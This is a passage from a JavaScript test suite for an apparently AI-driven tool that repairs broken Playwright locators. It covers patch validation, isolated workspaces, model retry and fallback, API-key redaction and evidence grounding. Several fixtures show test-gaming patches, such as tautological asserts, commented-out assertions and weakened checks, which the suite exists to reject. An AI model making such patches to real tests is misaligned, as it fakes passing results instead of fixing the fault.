        runTest("Rejects patch replacing real assertion with tautology expect(true).toBe(true)", () => {
            const originalTest = `
                function verifyProduct() {
                    expect(product.title).toBe("Running Shoes");
                }
                module.exports = { verifyProduct };
            `;
            const tautologyPatched = `
                function verifyProduct() {
                    expect(true).toBe(true);
                }
                module.exports = { verifyProduct };
            `;
            assert.throws(() => validatePatchIntegrity(originalTest, tautologyPatched), /introduces tautological \(dummy\) assertions/);
        });

        runTest("Rejects patch replacing real assertion with tautology expect(1).toBe(1)", () => {
            const originalTest = `
                function verifyProduct() {
                    expect(product.price).toBe(99);
                }
                module.exports = { verifyProduct };
            `;
            const tautologyPatched = `
                function verifyProduct() {
                    expect(1).toBe(1);
                }
                module.exports = { verifyProduct };
            `;
            assert.throws(() => validatePatchIntegrity(originalTest, tautologyPatched), /introduces tautological \(dummy\) assertions/);
        });

        runTest("Rejects patch commenting out an assertion", () => {
            const originalTest = `
                function verifyProduct() {
                    expect(product.price).toBe(99);
                }
                module.exports = { verifyProduct };
            `;
            const commentedPatched = `
                function verifyProduct() {
                    // expect(product.price).toBe(99);
                }
                module.exports = { verifyProduct };
            `;
            assert.throws(() => validatePatchIntegrity(originalTest, commentedPatched), /comments out test assertions/);
        });

        runTest("Rejects patch weakening strict assertion to loose toBeDefined()", () => {
            const originalTest = `
                function verifyProduct() {
                    expect(product.price).toBe(99);
                }
                module.exports = { verifyProduct };
            `;
            const weakenedPatched = `
                function verifyProduct() {
                    expect(product.price).toBeDefined();
                }
                module.exports = { verifyProduct };
            `;
            assert.throws(() => validatePatchIntegrity(originalTest, weakenedPatched), /weakens strict assertion to loose assertion/);
        });

        runTest("Approves valid single-file POM diff and cleanly applies it via applyUnifiedDiff", () => {
            const origPom = fs.readFileSync(path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js"), "utf8");
            const updatedCode = origPom.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'this.heading = page.getByTestId("page-title");'
            );
            const diff = generateUnifiedDiff("tests/pages/ProductListPage.js", origPom, updatedCode);

            const validation = validateUnifiedDiff(diff, ROOT_DIR);
            assert.strictEqual(validation.valid, true);
            assert.strictEqual(validation.targetFile, "tests/pages/ProductListPage.js");

            const applied = applyUnifiedDiff(origPom, diff);
            assert.strictEqual(applied.replace(/\r\n/g, "\n").trim(), updatedCode.replace(/\r\n/g, "\n").trim());
        });

        // --------------------------------------------------------------------------
        // SUITE 9: Isolated Workspace Lifecycle & Rollback Guard
        // --------------------------------------------------------------------------
        console.log("\n[Suite 9] Isolated Workspace Lifecycle & Rollback Guard");

        runTest("Creates isolated directory workspace with junctioned node_modules", () => {
            const workspace = IsolatedWorkspaceManager.createWorkspace(ROOT_DIR, { isolationMode: "directory" });
            try {
                assert.ok(fs.existsSync(workspace.workspaceDir));
                assert.ok(fs.existsSync(path.join(workspace.workspaceDir, "package.json")));
                assert.ok(fs.existsSync(path.join(workspace.workspaceDir, "tests/pages/ProductListPage.js")));
                assert.ok(fs.existsSync(path.join(workspace.workspaceDir, "node_modules")));
            } finally {
                IsolatedWorkspaceManager.cleanup(workspace.workspaceDir, workspace.mode);
            }
            assert.strictEqual(fs.existsSync(workspace.workspaceDir), false);
        });

        runTest("Cleanup unlinks junction safely without deleting base node_modules", () => {
            const workspace = IsolatedWorkspaceManager.createWorkspace(ROOT_DIR, { isolationMode: "directory" });
            const baseNodeModules = path.resolve(ROOT_DIR, "node_modules");

            assert.ok(fs.existsSync(baseNodeModules), "Base node_modules must exist");
            IsolatedWorkspaceManager.cleanup(workspace.workspaceDir, workspace.mode);

            assert.strictEqual(fs.existsSync(workspace.workspaceDir), false, "Workspace must be removed");
            assert.ok(fs.existsSync(baseNodeModules), "Base node_modules must remain intact after cleanup");
        });

        runTest("Applies candidate patch ONLY inside isolated workspace, leaving working tree untouched", () => {
            const origPomPath = path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js");
            const originalPomContent = fs.readFileSync(origPomPath, "utf8");

            const patchedContent = originalPomContent.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'this.heading = page.getByTestId("page-title");'
            );
            const diff = generateUnifiedDiff("tests/pages/ProductListPage.js", originalPomContent, patchedContent);

            const workspace = IsolatedWorkspaceManager.createWorkspace(ROOT_DIR, { isolationMode: "directory" });
            try {
                // Apply patch inside workspace
                IsolatedWorkspaceManager.applyPatch(workspace.workspaceDir, "tests/pages/ProductListPage.js", diff);

                // Verify workspace file was updated
                const workspacePom = fs.readFileSync(path.join(workspace.workspaceDir, "tests/pages/ProductListPage.js"), "utf8");
                assert.ok(workspacePom.includes('page.getByTestId("page-title")'));

                // Verify base repository working tree file is 100% UNTOUCHED
                const livePom = fs.readFileSync(origPomPath, "utf8");
                assert.strictEqual(livePom, originalPomContent, "Safety Violation: Original working tree was modified!");
            } finally {
                IsolatedWorkspaceManager.cleanup(workspace.workspaceDir, workspace.mode);
            }
        });

        await runAsyncTest("validateInIsolation with passing test runner reports success and cleans up", async () => {
            const origPomPath = path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js");
            const originalPomContent = fs.readFileSync(origPomPath, "utf8");

            const patchedContent = originalPomContent.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'this.heading = page.getByTestId("page-title");'
            );
            const diff = generateUnifiedDiff("tests/pages/ProductListPage.js", originalPomContent, patchedContent);

            const mockPassingRunner = async ({ workspaceDir }) => {
                // Confirm patch exists inside workspace during test run
                const pom = fs.readFileSync(path.join(workspaceDir, "tests/pages/ProductListPage.js"), "utf8");
                assert.ok(pom.includes('page.getByTestId("page-title")'));
                return { passed: true, exitCode: 0, output: "1 test passed" };
            };

            const result = await IsolatedWorkspaceManager.validateInIsolation({
                baseDir: ROOT_DIR,
                targetFileRel: "tests/pages/ProductListPage.js",
                diffString: diff,
                isolationMode: "directory",
                testRunner: mockPassingRunner
            });

            assert.strictEqual(result.success, true);
            assert.strictEqual(result.exitCode, 0);

            // Verify live working tree file is untouched
            const livePom = fs.readFileSync(origPomPath, "utf8");
            assert.strictEqual(livePom, originalPomContent, "Live working tree modified during validation!");
        });

        await runAsyncTest("validateInIsolation with failing test runner reports failure, preserves working tree, and cleans up", async () => {
            const origPomPath = path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js");
            const originalPomContent = fs.readFileSync(origPomPath, "utf8");

            const patchedContent = originalPomContent.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'this.heading = page.getByTestId("page-title");'
            );
            const diff = generateUnifiedDiff("tests/pages/ProductListPage.js", originalPomContent, patchedContent);

            const mockFailingRunner = async () => {
                return { passed: false, exitCode: 1, output: "1 failed: locator timeout" };
            };

            const result = await IsolatedWorkspaceManager.validateInIsolation({
                baseDir: ROOT_DIR,
                targetFileRel: "tests/pages/ProductListPage.js",
                diffString: diff,
                isolationMode: "directory",
                testRunner: mockFailingRunner
            });

            assert.strictEqual(result.success, false);
            assert.strictEqual(result.exitCode, 1);

            // Verify live working tree file is untouched
            const livePom = fs.readFileSync(origPomPath, "utf8");
            assert.strictEqual(livePom, originalPomContent, "Live working tree modified during failed validation!");
        });

        await runAsyncTest("runRepairAgent with validateInIsolation=true marks status VERIFIED when test passes", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator-isolated.json");
            fs.writeFileSync(validLocatorPath, JSON.stringify({
                status: "FAILED",
                timestamp: new Date().toISOString(),
                failures: [{
                    testTitle: "Catalog page heading",
                    errorMessage: "Timeout 5000ms waiting for locator('.heading')",
                    observedSymptom: "LOCATOR_LOOKUP_TIMEOUT",
                    targetLocator: "locator('.heading')"
                }]
            }), "utf8");

            const origPomPath = path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js");
            const originalPomContent = fs.readFileSync(origPomPath, "utf8");

            const patchedContent = originalPomContent.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'this.heading = page.getByTestId("page-title");'
            );

            const successfulMockClient = {
                generateContent: async () => ({
                    canHeal: true,
                    rootCause: "STALE_LOCATOR",
                    diagnosis: "Heading element has been modernized to use data-testid='page-title'.",
                    targetFile: "tests/pages/ProductListPage.js",
                    originalLocator: 'page.getByRole("heading", { level: 1, name: "Products" })',
                    healedLocator: 'page.getByTestId("page-title")',
                    patchedFileContent: patchedContent
                })
            };

            const result = await runRepairAgent({
                contextPath: validLocatorPath,
                repairDir: TEMP_TEST_DIR,
                modelClient: successfulMockClient,
                validateInIsolation: true,
                isolationMode: "directory",
                testRunner: async () => ({ passed: true, exitCode: 0, output: "UI tests passed" })
            });

            assert.strictEqual(result.status, "VERIFIED");
            assert.strictEqual(result.rootCause, "STALE_LOCATOR");
            assert.strictEqual(result.healedLocator, 'page.getByTestId("page-title")');

            // Working tree untouched
            const livePom = fs.readFileSync(origPomPath, "utf8");
            assert.strictEqual(livePom, originalPomContent);
        });

        await runAsyncTest("runRepairAgent with validateInIsolation=true marks status VALIDATION_FAILED when test fails", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator-isolated-fail.json");
            fs.writeFileSync(validLocatorPath, JSON.stringify({
                status: "FAILED",
                timestamp: new Date().toISOString(),
                failures: [{
                    testTitle: "Catalog page heading",
                    errorMessage: "Timeout 5000ms waiting for locator('.heading')",
                    observedSymptom: "LOCATOR_LOOKUP_TIMEOUT",
                    targetLocator: "locator('.heading')"
                }]
            }), "utf8");

            const origPomPath = path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js");
            const originalPomContent = fs.readFileSync(origPomPath, "utf8");

            const patchedContent = originalPomContent.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'this.heading = page.getByTestId("broken-title");'
            );

            const successfulMockClient = {
                generateContent: async () => ({
                    canHeal: true,
                    rootCause: "STALE_LOCATOR",
                    diagnosis: "Heading element updated",
                    targetFile: "tests/pages/ProductListPage.js",
                    originalLocator: 'page.getByRole("heading", { level: 1, name: "Products" })',
                    healedLocator: 'page.getByTestId("broken-title")',
                    patchedFileContent: patchedContent
                })
            };

            const result = await runRepairAgent({
                contextPath: validLocatorPath,
                repairDir: TEMP_TEST_DIR,
                modelClient: successfulMockClient,
                validateInIsolation: true,
                isolationMode: "directory",
                testRunner: async () => ({ passed: false, exitCode: 1, output: "Test still timed out" })
            });

            assert.strictEqual(result.status, "VALIDATION_FAILED");
            assert.strictEqual(result.reason, "TEST_VERIFICATION_FAILED");

            // Working tree untouched
            const livePom = fs.readFileSync(origPomPath, "utf8");
            assert.strictEqual(livePom, originalPomContent);
        });

        await runAsyncTest("Rollback guard: teardown cleans up workspace even on unexpected exception", async () => {
            const origPomPath = path.resolve(ROOT_DIR, "tests/pages/ProductListPage.js");
            const originalPomContent = fs.readFileSync(origPomPath, "utf8");

            const patchedContent = originalPomContent.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'this.heading = page.getByTestId("page-title");'
            );
            const diff = generateUnifiedDiff("tests/pages/ProductListPage.js", originalPomContent, patchedContent);

            let capturedWorkspaceDir = null;
            const throwingRunner = async ({ workspaceDir }) => {
                capturedWorkspaceDir = workspaceDir;
                throw new Error("Simulated unhandled runner crash!");
            };

            await assert.rejects(async () => {
                await IsolatedWorkspaceManager.validateInIsolation({
                    baseDir: ROOT_DIR,
                    targetFileRel: "tests/pages/ProductListPage.js",
                    diffString: diff,
                    isolationMode: "directory",
                    testRunner: throwingRunner
                });
            }, /Simulated unhandled runner crash!/);

            // Workspace must have been cleaned up in finally block
            assert.ok(capturedWorkspaceDir);
            assert.strictEqual(fs.existsSync(capturedWorkspaceDir), false, "Workspace must be cleaned up on error");

            // Base repository untouched
            const livePom = fs.readFileSync(origPomPath, "utf8");
            assert.strictEqual(livePom, originalPomContent);
        });

        // --------------------------------------------------------------------------
        // SUITE 10: Model Configuration, Transient Retry, Fallback & Security Tests
        // --------------------------------------------------------------------------
        console.log("\n[Suite 10] Model Configuration, Transient Retry, Fallback & Security Tests");

        runTest("DEFAULT_MODEL and DEFAULT_FALLBACK_MODEL constants are exported with correct defaults", () => {
            assert.strictEqual(DEFAULT_MODEL, "gemini-3.5-flash");
            assert.strictEqual(DEFAULT_FALLBACK_MODEL, "gemini-3.5-flash-lite");
        });

        runTest("sanitizeErrorMessage scrubs explicit keys, env keys, AIza patterns, and key query params", () => {
            const secretKey = "AIzaSyTestSecretKey1234567890abcdef";
            const raw1 = `Error calling API with key ${secretKey}: 401 Unauthorized`;
            const sanitized1 = sanitizeErrorMessage(raw1, secretKey);
            assert.ok(!sanitized1.includes(secretKey), "Explicit API key must be redacted");
            assert.ok(sanitized1.includes("[REDACTED_API_KEY]"));

            const raw2 = "https://generativelanguage.googleapis.com/v1beta/models?key=AIzaSyDifferentSecretToken99999";
            const sanitized2 = sanitizeErrorMessage(raw2);
            assert.ok(!sanitized2.includes("AIzaSyDifferentSecretToken99999"), "AIza pattern must be redacted");
            assert.ok(sanitized2.includes("[REDACTED_API_KEY]"));
        });

        runTest("isTransientError distinguishes transient from permanent errors", () => {
            // Permanent errors (must NOT retry)
            assert.strictEqual(isTransientError({ status: 400, message: "400 Bad Request" }), false);
            assert.strictEqual(isTransientError({ status: 401, message: "401 Unauthorized" }), false);
            assert.strictEqual(isTransientError({ status: 403, message: "403 Forbidden" }), false);
            assert.strictEqual(isTransientError(new Error("API_KEY_INVALID: API key not valid")), false);
            assert.strictEqual(isTransientError(new Error("MISSING_API_KEY: key required")), false);
            assert.strictEqual(isTransientError(new Error("InvalidArgument: malformed_request payload")), false);

            // Transient errors (must retry)
            assert.strictEqual(isTransientError({ status: 503, message: "Service Unavailable" }), true);
            assert.strictEqual(isTransientError({ status: 429, message: "Too Many Requests" }), true);
            assert.strictEqual(isTransientError({ status: 500, message: "Internal Server Error" }), true);
            assert.strictEqual(isTransientError({ status: 502, message: "Bad Gateway" }), true);
            assert.strictEqual(isTransientError({ status: 504, message: "Gateway Timeout" }), true);
            assert.strictEqual(isTransientError(new Error("503 The model is overloaded. Please try again.")), true);
            assert.strictEqual(isTransientError(new Error("429 RESOURCE_EXHAUSTED: quota exceeded")), true);
            assert.strictEqual(isTransientError(new Error("The operation was aborted due to timeout")), true);
            assert.strictEqual(isTransientError(new Error("read ECONNRESET")), true);
        });

        await runAsyncTest("invokeModel resolves DEFAULT_MODEL when no model or GEMINI_MODEL is set", async () => {
            let capturedModel = null;
            const mockClient = {
                generateContent: async ({ model }) => {
                    capturedModel = model;
                    return { canHeal: false, rootCause: "APPLICATION_DEFECT", diagnosis: "Test mock" };
                }
            };

            const savedEnv = process.env.GEMINI_MODEL;
            delete process.env.GEMINI_MODEL;
            try {
                await invokeModel({ prompt: "test prompt", modelClient: mockClient });
                assert.strictEqual(capturedModel, "gemini-3.5-flash");
            } finally {
                if (savedEnv !== undefined) process.env.GEMINI_MODEL = savedEnv;
            }
        });

        await runAsyncTest("invokeModel respects GEMINI_MODEL environment variable", async () => {
            let capturedModel = null;
            const mockClient = {
                generateContent: async ({ model }) => {
                    capturedModel = model;
                    return { canHeal: false, rootCause: "APPLICATION_DEFECT", diagnosis: "Test mock" };
                }
            };

            const savedEnv = process.env.GEMINI_MODEL;
            process.env.GEMINI_MODEL = "gemini-3.5-flash-lite";
            try {
                await invokeModel({ prompt: "test prompt", modelClient: mockClient });
                assert.strictEqual(capturedModel, "gemini-3.5-flash-lite");
            } finally {
                if (savedEnv !== undefined) process.env.GEMINI_MODEL = savedEnv;
                else delete process.env.GEMINI_MODEL;
            }
        });

        await runAsyncTest("invokeModel prioritizes options.model over GEMINI_MODEL env var", async () => {
            let capturedModel = null;
            const mockClient = {
                generateContent: async ({ model }) => {
                    capturedModel = model;
                    return { canHeal: false, rootCause: "APPLICATION_DEFECT", diagnosis: "Test mock" };
                }
            };

            const savedEnv = process.env.GEMINI_MODEL;
            process.env.GEMINI_MODEL = "gemini-2.5-flash";
            try {
                await invokeModel({ prompt: "test prompt", modelClient: mockClient, model: "gemini-experimental-custom" });
                assert.strictEqual(capturedModel, "gemini-experimental-custom");
            } finally {
                if (savedEnv !== undefined) process.env.GEMINI_MODEL = savedEnv;
                else delete process.env.GEMINI_MODEL;
            }
        });

        await runAsyncTest("invokeModel primary success on first attempt without retrying", async () => {
            let callCount = 0;
            const mockClient = {
                generateContent: async ({ model }) => {
                    callCount++;
                    return { canHeal: true, rootCause: "STALE_LOCATOR", diagnosis: "Success on first try" };
                }
            };

            const result = await invokeModel({
                prompt: "test prompt",
                modelClient: mockClient,
                model: "gemini-3.5-flash",
                fallbackModel: "gemini-3.5-flash-lite",
                baseDelayMs: 0
            });

            assert.strictEqual(callCount, 1, "Must succeed on first attempt");
            assert.strictEqual(result._modelUsed, "gemini-3.5-flash");
            assert.strictEqual(result.canHeal, true);
        });

        await runAsyncTest("invokeModel retries transient error on primary model with backoff and succeeds", async () => {
            let attempts = 0;
            const modelsCalled = [];
            const mockClient = {
                generateContent: async ({ model }) => {
                    attempts++;
                    modelsCalled.push(model);
                    if (attempts === 1) {
                        const err = new Error("503 The model is overloaded. Please try again later.");
                        err.status = 503;
                        throw err;
                    }
                    return { canHeal: true, rootCause: "STALE_LOCATOR", diagnosis: "Recovered on attempt 2" };
                }
            };

            const result = await invokeModel({
                prompt: "test prompt",
                modelClient: mockClient,
                model: "gemini-3.5-flash",
                fallbackModel: "gemini-3.5-flash-lite",
                maxAttemptsPerModel: 3,
                baseDelayMs: 0
            });

            assert.strictEqual(attempts, 2, "Must retry and succeed on attempt 2");
            assert.deepStrictEqual(modelsCalled, ["gemini-3.5-flash", "gemini-3.5-flash"]);
            assert.strictEqual(result._modelUsed, "gemini-3.5-flash");
            assert.strictEqual(result.diagnosis, "Recovered on attempt 2");
        });

        await runAsyncTest("invokeModel exhausts primary model retries and cascades to fallback model successfully", async () => {
            const modelsCalled = [];
            const mockClient = {
                generateContent: async ({ model }) => {
                    modelsCalled.push(model);
                    if (model === "gemini-3.5-flash") {
                        const err = new Error("429 RESOURCE_EXHAUSTED: rate limit exceeded");
                        err.status = 429;
                        throw err;
                    }
                    if (model === "gemini-3.5-flash-lite") {
                        return { canHeal: true, rootCause: "STALE_LOCATOR", diagnosis: "Healed by fallback model" };
                    }
                }
            };

            const result = await invokeModel({
                prompt: "test prompt",
                modelClient: mockClient,
                model: "gemini-3.5-flash",
                fallbackModel: "gemini-3.5-flash-lite",
                maxAttemptsPerModel: 3,
                baseDelayMs: 0
            });

            assert.strictEqual(modelsCalled.length, 4, "Must try primary 3 times, then fallback 1 time");
            assert.strictEqual(modelsCalled.filter((m) => m === "gemini-3.5-flash").length, 3);
            assert.strictEqual(modelsCalled.filter((m) => m === "gemini-3.5-flash-lite").length, 1);
            assert.strictEqual(result._modelUsed, "gemini-3.5-flash-lite");
            assert.strictEqual(result.diagnosis, "Healed by fallback model");
        });

        await runAsyncTest("invokeModel throws when both primary and fallback models fail with transient errors", async () => {
            const modelsCalled = [];
            const mockClient = {
                generateContent: async ({ model }) => {
                    modelsCalled.push(model);
                    const err = new Error("503 Service Unavailable");
                    err.status = 503;
                    throw err;
                }
            };

            let thrownError = null;
            try {
                await invokeModel({
                    prompt: "test prompt",
                    modelClient: mockClient,
                    model: "gemini-3.5-flash",
                    fallbackModel: "gemini-3.5-flash-lite",
                    maxAttemptsPerModel: 3,
                    baseDelayMs: 0
                });
            } catch (err) {
                thrownError = err;
            }

            assert.ok(thrownError, "Should throw error after exhausting both models");
            assert.strictEqual(modelsCalled.length, 6, "Must try 3 times for primary and 3 times for fallback");
            assert.strictEqual(modelsCalled.filter((m) => m === "gemini-3.5-flash").length, 3);
            assert.strictEqual(modelsCalled.filter((m) => m === "gemini-3.5-flash-lite").length, 3);
            assert.match(thrownError.message, /503 Service Unavailable/);
        });

        await runAsyncTest("invokeModel aborts immediately on permanent errors without retrying or fallback", async () => {
            const modelsCalled = [];
            const mockClient = {
                generateContent: async ({ model }) => {
                    modelsCalled.push(model);
                    const err = new Error("401 Unauthorized: Invalid API Key AIzaSyFakeSecret12345");
                    err.status = 401;
                    throw err;
                }
            };

            let thrownError = null;
            try {
                await invokeModel({
                    prompt: "test prompt",
                    modelClient: mockClient,
                    model: "gemini-3.5-flash",
                    fallbackModel: "gemini-3.5-flash-lite",
                    apiKey: "AIzaSyFakeSecret12345",
                    maxAttemptsPerModel: 3,
                    baseDelayMs: 0
                });
            } catch (err) {
                thrownError = err;
            }

            assert.ok(thrownError, "Must throw permanent error immediately");
            assert.strictEqual(modelsCalled.length, 1, "Must NOT retry permanent error or switch to fallback");
            assert.strictEqual(modelsCalled[0], "gemini-3.5-flash");
            assert.ok(!thrownError.message.includes("AIzaSyFakeSecret12345"), "API key must be redacted in thrown error");
            assert.ok(thrownError.message.includes("[REDACTED_API_KEY]"));
        });

        await runAsyncTest("runRepairAgent records fallback model in summary and result when fallback is used", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator.json");
            const summaryFilePath = path.resolve(TEMP_TEST_DIR, "fallback-model-summary.json");

            const mockClient = {
                generateContent: async ({ model }) => {
                    if (model === "gemini-3.5-flash") {
                        const err = new Error("503 Model Overloaded");
                        err.status = 503;
                        throw err;
                    }
                    return {
                        canHeal: false,
                        rootCause: "APPLICATION_DEFECT",
                        diagnosis: "Defect observed by fallback model."
                    };
                }
            };

            const result = await runRepairAgent({
                contextPath: validLocatorPath,
                repairDir: TEMP_TEST_DIR,
                summaryPath: summaryFilePath,
                modelClient: mockClient,
                model: "gemini-3.5-flash",
                fallbackModel: "gemini-3.5-flash-lite",
                maxAttemptsPerModel: 2,
                baseDelayMs: 0
            });

            assert.strictEqual(result.status, "ABSTAINED");
            assert.strictEqual(result.model, "gemini-3.5-flash-lite", "Result must record actual fallback model used");
        });

        await runAsyncTest("runRepairAgent propagates configured model to summary result and mock client", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator.json");
            let capturedModel = null;
            const mockClient = {
                generateContent: async ({ model }) => {
                    capturedModel = model;
                    return {
                        canHeal: false,
                        rootCause: "APPLICATION_DEFECT",
                        diagnosis: "Application error detected by model."
                    };
                }
            };

            const customModelName = "gemini-pro-test";
            const summaryFilePath = path.resolve(TEMP_TEST_DIR, "model-test-summary.json");

            const result = await runRepairAgent({
                contextPath: validLocatorPath,
                repairDir: TEMP_TEST_DIR,
                summaryPath: summaryFilePath,
                modelClient: mockClient,
                model: customModelName,
                baseDelayMs: 0
            });

            assert.strictEqual(result.status, "ABSTAINED");
            assert.strictEqual(capturedModel, customModelName);
        });

        // --------------------------------------------------------------------------
        // SUITE 11: Evidence-Based Locator Grounding & Anti-Guessing Guardrails
        // --------------------------------------------------------------------------
        console.log("\n[Suite 11] Evidence Grounding & Insufficient Evidence Safeguards");

        runTest("resolveEvidence returns hasEvidence: false when no evidence is provided", () => {
            const ev = resolveEvidence({}, {});
            assert.strictEqual(ev.hasEvidence, false);
            assert.strictEqual(ev.domSnapshot, null);
        });

        runTest("resolveEvidence ingests inline domSnapshot and accessibilitySnapshot", () => {
            const ev = resolveEvidence({
                domSnapshot: "<h1>Products</h1>",
                accessibilitySnapshot: 'heading "Products" [level=1]'
            }, {});
            assert.strictEqual(ev.hasEvidence, true);
            assert.strictEqual(ev.domSnapshot, "<h1>Products</h1>");
            assert.strictEqual(ev.accessibilitySnapshot, 'heading "Products" [level=1]');
        });

        runTest("resolveEvidence reads external JSON evidence file (--evidence / evidencePath)", () => {
            const samplePath = path.resolve(TEMP_TEST_DIR, "external-evidence.json");
            fs.writeFileSync(samplePath, JSON.stringify({
                domSnapshot: '<div class="header"><h1>Products Catalog</h1></div>',
                accessibilitySnapshot: 'heading "Products Catalog" [level=1]'
            }), "utf8");

            const ev = resolveEvidence({ evidencePath: samplePath }, {});
            assert.strictEqual(ev.hasEvidence, true);
            assert.match(ev.domSnapshot, /Products Catalog/);
            assert.strictEqual(ev.source, `file:${samplePath}`);
        });

        runTest("resolveEvidence ingests evidence attached to failure in healing-context.json", () => {
            const failure = {
                domSnapshot: "<main><h1>Products</h1></main>",
                accessibilitySnapshot: 'heading "Products"'
            };
            const ev = resolveEvidence({}, failure);
            assert.strictEqual(ev.hasEvidence, true);
            assert.strictEqual(ev.domSnapshot, "<main><h1>Products</h1></main>");
            assert.strictEqual(ev.source, "healing-context.json");
        });

        runTest("buildModelPrompt includes DOM and accessibility evidence section when evidence is provided", () => {
            const prompt = buildModelPrompt({
                failure: { testTitle: "test", errorMessage: "err", targetLocator: "h1" },
                pomContent: "class POM {}",
                pomPathRel: "tests/pages/ProductListPage.js",
                geminiMdRules: "RULES",
                evidence: {
                    hasEvidence: true,
                    domSnapshot: "<header><h1>Products</h1></header>",
                    accessibilitySnapshot: 'heading "Products" [level=1]',
                    source: "live-mcp-evidence"
                }
            });
            assert.match(prompt, /OBSERVED DOM & ACCESSIBILITY EVIDENCE \(GROUND TRUTH\)/);
            assert.match(prompt, /<DOM_EVIDENCE>/);
            assert.match(prompt, /<header><h1>Products<\/h1><\/header>/);
            assert.match(prompt, /<ACCESSIBILITY_EVIDENCE>/);
            assert.match(prompt, /heading "Products" \[level=1\]/);
            assert.match(prompt, /SEMANTIC LOCATOR PRIORITY/);
        });

        runTest("buildModelPrompt includes anti-guessing notice when evidence is missing", () => {
            const prompt = buildModelPrompt({
                failure: { testTitle: "test", errorMessage: "err", targetLocator: "h1" },
                pomContent: "class POM {}",
                pomPathRel: "tests/pages/ProductListPage.js",
                geminiMdRules: "RULES",
                evidence: { hasEvidence: false }
            });
            assert.match(prompt, /\[NO LIVE DOM OR ACCESSIBILITY EVIDENCE PROVIDED\]/);
            assert.match(prompt, /Anti-Guessing Rule/);
            assert.match(prompt, /MUST NOT guess or invent class names/);
        });

        runTest("validateEvidenceGrounding approves semantic locator present in observed evidence", () => {
            const evidence = {
                hasEvidence: true,
                domSnapshot: "<header><h1>Products</h1></header>",
                accessibilitySnapshot: 'heading "Products" [level=1]'
            };
            const proposal = {
                canHeal: true,
                healedLocator: 'page.getByRole("heading", { level: 1, name: "Products" })'
            };
            const check = validateEvidenceGrounding(proposal, evidence);
            assert.strictEqual(check.valid, true);
        });

        runTest("validateEvidenceGrounding rejects invented CSS class not found in DOM evidence", () => {
            const evidence = {
                hasEvidence: true,
                domSnapshot: "<header><h1>Products</h1></header>"
            };
            const proposal = {
                canHeal: true,
                healedLocator: 'page.locator("h1.products-catalog-invented-class")'
            };
            const check = validateEvidenceGrounding(proposal, evidence);
            assert.strictEqual(check.valid, false);
            assert.match(check.reason, /GROUNDING_VIOLATION/);
            assert.match(check.reason, /products-catalog-invented-class/);
        });

        runTest("validateEvidenceGrounding rejects repair attempt when evidence is missing and required", () => {
            const evidence = { hasEvidence: false };
            const proposal = {
                canHeal: true,
                healedLocator: 'page.getByRole("heading", { name: "Products" })'
            };
            const check = validateEvidenceGrounding(proposal, evidence, { requireEvidence: true });
            assert.strictEqual(check.valid, false);
            assert.match(check.reason, /INSUFFICIENT_EVIDENCE/);
        });

        await runAsyncTest("runRepairAgent abstains when model reports insufficient evidence (canHeal: false)", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator.json");
            const abstainingMock = {
                generateContent: async () => ({
                    canHeal: false,
                    rootCause: "STALE_LOCATOR",
                    diagnosis: "DOM evidence is insufficient to identify the new locator with certainty.",
                    evidenceObserved: "NONE"
                })
            };

            const result = await runRepairAgent({
                contextPath: validLocatorPath,
                repairDir: TEMP_TEST_DIR,
                modelClient: abstainingMock
            });

            assert.strictEqual(result.status, "ABSTAINED");
            assert.strictEqual(result.reason, "INSUFFICIENT_EVIDENCE_OR_DEFECT");
            assert.match(result.diagnosis, /insufficient/);
        });

        await runAsyncTest("runRepairAgent rejects model guess when evidence is missing (Anti-Guessing Guard)", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator.json");
            const originalPomPath = path.resolve(__dirname, "../tests/pages/ProductListPage.js");
            const originalPomContent = fs.readFileSync(originalPomPath, "utf8");

            const guessedPatchedContent = originalPomContent.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'this.heading = page.locator("h1.guessed-selector");'
            );

            const guessingMock = {
                generateContent: async () => ({
                    canHeal: true,
                    rootCause: "STALE_LOCATOR",
                    diagnosis: "Guessed selector without DOM evidence",
                    targetFile: "tests/pages/ProductListPage.js",
                    originalLocator: 'page.getByRole("heading", { level: 1, name: "Products" })',
                    healedLocator: 'page.locator("h1.guessed-selector")',
                    patchedFileContent: guessedPatchedContent
                })
            };

            const result = await runRepairAgent({
                contextPath: validLocatorPath,
                repairDir: TEMP_TEST_DIR,
                modelClient: guessingMock,
                requireEvidence: true
            });

            assert.strictEqual(result.status, "ABSTAINED");
            assert.strictEqual(result.reason, "GROUNDING_VIOLATION");
            assert.match(result.message, /INSUFFICIENT_EVIDENCE/);
        });

        await runAsyncTest("runRepairAgent successfully generates patch when semantic locator is grounded in DOM evidence", async () => {
            const validLocatorPath = path.resolve(TEMP_TEST_DIR, "valid-locator.json");
            const originalPomPath = path.resolve(__dirname, "../tests/pages/ProductListPage.js");
            const originalPomContent = fs.readFileSync(originalPomPath, "utf8");

            const patchedContent = originalPomContent.replace(
                'this.heading = page.getByRole("heading", { level: 1, name: "Products" });',
                'this.heading = page.getByRole("heading", { level: 1, name: "Products Catalog" });'
            );

            const groundedMock = {
                generateContent: async () => ({
                    canHeal: true,
                    rootCause: "STALE_LOCATOR",
                    diagnosis: "Heading text verified in live DOM snapshot as 'Products Catalog'.",
                    targetFile: "tests/pages/ProductListPage.js",
                    originalLocator: 'page.getByRole("heading", { level: 1, name: "Products" })',
                    healedLocator: 'page.getByRole("heading", { level: 1, name: "Products Catalog" })',
                    patchedFileContent: patchedContent,
